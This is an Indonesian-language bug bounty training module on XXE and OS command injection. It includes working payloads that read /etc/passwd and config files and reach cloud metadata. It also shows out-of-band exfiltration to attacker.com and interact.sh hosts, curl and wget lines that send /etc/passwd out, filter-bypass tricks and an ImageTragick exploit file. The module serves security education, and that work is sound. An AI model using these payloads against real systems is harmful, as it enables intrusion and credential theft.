# Sesi 14 — XXE & OS Command Injection

> **Level:** Intermediate–Advanced  
> **Durasi Estimasi:** 5–6 jam (teori + praktik)  
> **Prasyarat:** Sesi 02 (HTTP Fundamentals), Sesi 13 (SSRF), Sesi 12 (File Upload)  
> **Tools:** Burp Suite, Collaborator/Interactsh, xxe-tester

---

## 🎯 Tujuan Pembelajaran

Setelah menyelesaikan sesi ini, peserta mampu:
- Mengidentifikasi endpoint yang memproses XML dan potensi XXE
- Melakukan basic dan blind XXE untuk file read dan SSRF
- Mengidentifikasi OS Command Injection di berbagai konteks
- Bypass filter command injection umum
- Melakukan out-of-band data exfiltration untuk blind injection
- Menentukan impact dan severity yang tepat untuk laporan

---

## 📚 Bagian 1 — XML External Entity (XXE) Injection

### 1.1 Konsep XXE

XXE terjadi ketika **parser XML memproses entity referensi eksternal yang dikontrol attacker**. Entity dalam XML adalah shortcut untuk konten yang bisa di-define secara eksternal — termasuk dari file sistem atau URL jaringan.

```xml
<!-- XML normal dengan entity internal -->
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY name "John">  <!-- entity internal -->
]>
<note>
  <to>&name;</to>  <!-- → "John" -->
</note>

<!-- XXE: entity EKSTERNAL yang membaca file! -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">  <!-- membaca file sistem! -->
]>
<foo>
  <bar>&xxe;</bar>  <!-- konten /etc/passwd muncul di sini! -->
</foo>
```

### 1.2 Mengidentifikasi Endpoint Rentan XXE

```bash
# Endpoint yang mungkin proses XML:

1. Upload file (DOCX, XLSX, SVG, XML, PPTX — semua format Office adalah ZIP berisi XML)
2. API yang menerima Content-Type: application/xml
3. SOAP web services (/webservice, /soap, /api/soap)
4. RSS/Atom feed processors
5. SVG upload
6. Excel/Word import features

# Test: ubah Content-Type di Burp
# Dari: Content-Type: application/json
# Ke:   Content-Type: application/xml
# Dan konversi body JSON ke XML

# JSON:
{"username": "test", "password": "test123"}

# XML equivalent:
<?xml version="1.0"?>
<root>
  <username>test</username>
  <password>test123</password>
</root>
```

### 1.3 Basic XXE — File Read

```xml
<!-- Baca /etc/passwd -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

<!-- File Windows -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
]>
<root><data>&xxe;</data></root>

<!-- Baca file PHP dengan php:// wrapper -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root><data>&xxe;</data></root>
<!-- Response: base64 encoded isi config.php → decode untuk lihat credentials! -->
```

### 1.4 XXE untuk SSRF

```xml
<!-- XXE sebagai vector SSRF — request ke internal service -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>

<!-- Internal service scan -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<root><data>&xxe;</data></root>
```

### 1.5 Blind XXE — Out-of-Band Exfiltration

```xml
<!-- Ketika konten tidak muncul di response, gunakan OOB exfil -->

<!-- Step 1: Buat DTD file di server attacker (evil.dtd) -->
<!-- Simpan di: https://attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;

<!-- Step 2: Kirim payload ke target -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">
  %xxe;
]>
<root><data>test</data></root>

<!-- Flow:
1. Parser load evil.dtd dari attacker.com
2. Entity %file berisi isi /etc/passwd
3. Entity %exfiltrate kirim data ke attacker.com via HTTP
4. Attacker.com log request → dapat isi /etc/passwd!
-->
```

### 1.6 XXE melalui File Upload (SVG, DOCX, XLSX)

```xml
<!-- SVG file dengan XXE payload -->
<!-- Simpan sebagai: malicious.svg -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

<!-- Upload sebagai profile picture / attachment → parser SVG eksekusi XXE -->
```

```bash
# XXE dalam DOCX/XLSX (format Office adalah ZIP berisi XML)
# Ekstrak DOCX
unzip document.docx -d docx_extracted/

# Edit word/document.xml - tambahkan XXE
# Di awal file setelah XML declaration:
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Tambahkan &xxe; di dalam konten dokumen

# Re-zip
cd docx_extracted && zip -r ../malicious.docx *
# Upload malicious.docx ke fitur import/preview
```

### 1.7 XXE via XInclude

```xml
<!-- Ketika tidak bisa modifikasi DOCTYPE (server controlled DTD) -->
<!-- Gunakan XInclude yang lebih portabel -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## 📚 Bagian 2 — OS Command Injection

### 2.1 Konsep Command Injection

Command Injection terjadi ketika **aplikasi mengirimkan input user langsung ke shell OS** tanpa sanitasi yang memadai.

```python
# Kode Python rentan
import subprocess
filename = request.form['filename']  # user input
output = subprocess.check_output(f"file {filename}", shell=True)
# Jika filename = "test.txt; cat /etc/passwd"
# Command: file test.txt; cat /etc/passwd → eksekusi dua command!
```

### 2.2 Lokasi Umum Command Injection

```
Feature yang sering memanggil OS command:

1. PING / network tools: "Ping this host" → ping [INPUT]
2. WHOIS lookup
3. DNS lookup / nslookup
4. File operations: convert, resize, compress → ImageMagick, ffmpeg
5. Archive extraction: ZIP, TAR → unzip, tar
6. PDF generation dari URL/HTML
7. Git operations: git clone [URL]
8. SSH/SCP operations
9. Barcode/QR generation tools
10. Email sending dengan parameter dari user
```

### 2.3 Injection Characters

```bash
# Untuk Linux/Unix
;           → eksekusi command setelah ini terlepas dari yang sebelumnya
&&          → eksekusi command berikutnya jika command sebelumnya berhasil
||          → eksekusi command berikutnya jika command sebelumnya GAGAL
|           → pipe output ke command berikutnya
`command`   → backtick: eksekusi command dan substitute output
$(command)  → sama seperti backtick
\n          → newline (0x0a) — pisah command
%0a         → URL encoded newline

# Untuk Windows
&           → eksekusi command berikutnya
&&          → eksekusi jika sebelumnya berhasil
||          → eksekusi jika sebelumnya gagal
|           → pipe

# Contoh payload
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 `id`
127.0.0.1 $(id)
127.0.0.1%0aid         (URL encoded newline)
127.0.0.1\nid          (literal newline)
```

### 2.4 Blind Command Injection — Deteksi via Timing

```bash
# Jika tidak ada output, gunakan delay sebagai indicator

# Linux
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5
$(sleep 5)
`sleep 5`

# Windows
127.0.0.1 & timeout /T 5

# Jika response time bertambah ~5 detik → Command Injection confirmed!
```

### 2.5 Blind Command Injection — Out-of-Band Exfiltration

```bash
# Exfil via DNS (out-of-band, bypass outbound HTTP blocking)
# Setup Interactsh/Burp Collaborator dulu

# Kirim output command via DNS lookup
127.0.0.1; nslookup `whoami`.xxxx.interact.sh
127.0.0.1; nslookup $(id).xxxx.interact.sh
127.0.0.1; host `cat /etc/hostname`.xxxx.interact.sh

# Exfil via HTTP
127.0.0.1; curl https://xxxx.interact.sh/$(id)
127.0.0.1; wget "https://xxxx.interact.sh/?data=$(cat /etc/passwd | base64)"

# Contoh Interactsh receive:
# DNS query from: 1.2.3.4 → "www-data.xxxx.interact.sh"
# → whoami = www-data
```

### 2.6 Bypass Filter Command Injection

```bash
# Jika spasi difilter
# Gunakan $IFS (Internal Field Separator)
cat$IFS/etc/passwd
id;cat$IFS/etc/passwd

# Gunakan curly braces
{cat,/etc/passwd}
{id}

# Gunakan tab
cat	/etc/passwd   (tab karakter)
cat%09/etc/passwd   (URL encoded tab)

# Jika keyword "cat" difilter
c\at /etc/passwd     # backslash dalam command
ca$@t /etc/passwd    # null variable
c'a't /etc/passwd    # empty quotes
/bin/cat /etc/passwd # full path

# Jika karakter > difilter (untuk redirect)
command | tee /tmp/output   # gunakan tee
```

---

## 📚 Bagian 3 — Severity Assessment

### 3.1 XXE Severity Mapping

```
CRITICAL (P1):
→ File read dari /etc/passwd, /etc/shadow, SSH private keys
→ SSRF ke AWS metadata → credentials leak
→ Bisa baca source code dengan credentials database

HIGH (P2):
→ File read dari config file (database.yml, .env)
→ Blind SSRF ke internal services
→ SSRF ke internal admin panels

MEDIUM (P3):
→ Blind XXE confirmed tapi belum bisa baca file sensitif
→ XXE limited scope (read non-sensitive files)
→ XXE di file upload yang proses offline (delayed processing)
```

### 3.2 Command Injection Severity Mapping

```
CRITICAL (P1):
→ Blind command injection confirmed (timing atau OOB)
→ Command execution sebagai www-data/root
→ Bisa baca credentials/keys dari filesystem
→ Bisa reverse shell

HIGH (P2):
→ Error-based command injection (output terlihat)
→ Tapi eksekusi terbatas (sandboxed, read-only FS)
```

---

## 🔴 Real Bug Bounty Cases

### Case 1 — XXE di Facebook (Real — Disclosed)

> **Platform:** Facebook Bug Bounty  
> **Researcher:** Reginaldo Silva  
> **Tahun:** 2014  
> **Bounty:** $30,000

**Detail:**
Facebook menggunakan server OpenID yang memproses XML. Peneliti menemukan bahwa dengan mengirimkan DTD eksternal dalam XML OpenID request, server Facebook melakukan request ke server attacker — membuktikan blind XXE/SSRF.

```xml
<!-- Payload yang dikirim ke endpoint OpenID Facebook -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">
  %xxe;
]>
<OpenIDRequest>...</OpenIDRequest>
```

**Server Attacker Log:**
```
GET /evil.dtd HTTP/1.1
Host: attacker.com
User-Agent: [Facebook Server User Agent]
```

**Pelajaran:** Blind XXE yang "hanya" membuktikan SSRF tetap bernilai bounty besar jika targetnya adalah company besar dengan infrastruktur sensitif.  
**Sumber:** [Reginaldo Silva's disclosure writeup](https://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution) (publik)

---

### Case 2 — XXE di PayPal (Real — Disclosed)

> **Platform:** HackerOne — PayPal  
> **Referensi:** Pola dari PayPal XXE reports yang disclosed  
> **Severity:** Critical

**Skenario:**
PayPal memiliki endpoint internal yang memproses XML untuk import data. Peneliti menemukan bahwa dengan mengubah Content-Type ke `application/xml` dan mengirimkan payload XXE, server PayPal merespons dengan isi file internal.

```http
POST /api/import HTTP/1.1
Host: api.paypal.com
Content-Type: application/xml  ← ubah dari JSON ke XML

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<import>
  <data>&xxe;</data>
</import>
```

---

### Case 3 — Command Injection di Ripe NCC (Real — Disclosed)

> **Platform:** HackerOne — Ripe NCC  
> **Referensi:** [Disclosed HackerOne Reports](https://hackerone.com/ripe_ncc)  
> **Severity:** Critical

**Skenario:**
RIPE NCC (European IP registry) memiliki tool pengecekan routing yang menerima IP address sebagai input. IP tersebut langsung dimasukkan ke command traceroute/ping di server.

```http
# Normal: ping tool
POST /tools/ping HTTP/1.1
{"host": "8.8.8.8"}

# Command injection
{"host": "8.8.8.8; id; whoami"}

# Response mengandung:
# PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
# root   ← atau www-data tergantung konfigurasi
```

---

### Case 4 — Blind Command Injection via ImageMagick (Real Pattern)

> **Referensi:** CVE-2016-3714 "ImageTragick" — real vulnerability  
> **Source:** ImageMagick Security Advisory (publik)  
> **Severity:** Critical

**CVE-2016-3714 (ImageTragick):**
ImageMagick memiliki command injection di beberapa file format yang di-proses. File yang diupload dan di-proses oleh ImageMagick dapat mengeksekusi command arbitrary.

```bash
# File .mvg (Magick Vector Graphics) berbahaya
# Simpan sebagai exploit.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context

# Atau dengan format yang lebih eksplisit
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?cmd=id|id'
pop graphic-context
```

**Pelajaran:** Selalu uji file upload yang di-proses oleh image processing library seperti ImageMagick, FFmpeg, atau LibreOffice — semuanya memiliki riwayat command injection.

---

## 🛠️ Lab Praktik

### Lab 1 — PortSwigger Web Academy (Gratis)
- 🔗 [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
- 🔗 [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
- 🔗 [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
- 🔗 [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
- 🔗 [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

### Lab 2 — TryHackMe
- 🔗 [XXE Injection](https://tryhackme.com/room/xxe)
- 🔗 [Command Injection](https://tryhackme.com/room/oscommandinjection)

### Lab 3 — HackTheBox Academy
- 🔗 [Web Attacks Module (XXE section)](https://academy.hackthebox.com/module/details/134)
- 🔗 [Command Injections Module](https://academy.hackthebox.com/module/details/109)

### Lab 4 — DVWA
```bash
docker run -p 80:80 vulnerables/web-dvwa
# Modul: Command Injection
```

---

## 📋 XXE & Command Injection Testing Checklist

```markdown
## XXE Checklist

### Identifikasi Attack Surface
- [ ] Endpoint menerima XML (Content-Type: application/xml)?
- [ ] SOAP endpoint (/soap, /webservice)?
- [ ] File upload (SVG, DOCX, XLSX, XML)?
- [ ] Coba ubah JSON request ke XML format

### Payload Test
- [ ] Basic file read: file:///etc/passwd
- [ ] Windows: file:///C:/windows/win.ini
- [ ] PHP wrapper: php://filter/...
- [ ] SSRF via XXE: http://169.254.169.254/
- [ ] Blind XXE dengan Collaborator/Interactsh

## Command Injection Checklist

### Identifikasi Attack Surface
- [ ] Ping/traceroute/nslookup tool?
- [ ] File conversion/processing?
- [ ] Git clone, archive extraction?
- [ ] Parameter yang terlihat seperti hostname/filename?

### Detection
- [ ] ; id → lihat output?
- [ ] && sleep 5 → delay 5 detik?
- [ ] | id → lihat output?
- [ ] Blind: curl/nslookup ke Collaborator?

### Bypass
- [ ] $IFS untuk spasi
- [ ] c\at untuk bypass keyword filter
- [ ] Base64 encoded command
- [ ] Backtick vs $() substitution
```

---

## 📖 Referensi & Bacaan Lanjutan

| Sumber | Link | Topik |
|--------|------|-------|
| PortSwigger | [XXE Guide](https://portswigger.net/web-security/xxe) | Complete XXE |
| PortSwigger | [Command Injection Guide](https://portswigger.net/web-security/os-command-injection) | Command injection |
| OWASP | [XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) | Defense |
| PayloadsAllTheThings | [XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) | Payload collection |
| PayloadsAllTheThings | [Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) | Payload collection |

---

## 🔑 Key Takeaways

1. **XXE makin jarang tapi impact tetap critical** — selalu test endpoint yang proses XML dan file upload
2. **Blind XXE via OOB** — Interactsh/Collaborator wajib dikuasai untuk test server yang tidak return data
3. **Content-Type manipulation** — ubah JSON ke XML adalah teknik discovery yang powerful
4. **Command injection di image/file processors** — ImageMagick, FFmpeg, LibreOffice memiliki riwayat vuln
5. **Timing attack sebagai confirmation** — delay via sleep adalah bukti valid tanpa harus lihat output

---

*Sesi berikutnya: **Sesi 15 — Business Logic Vulnerabilities***
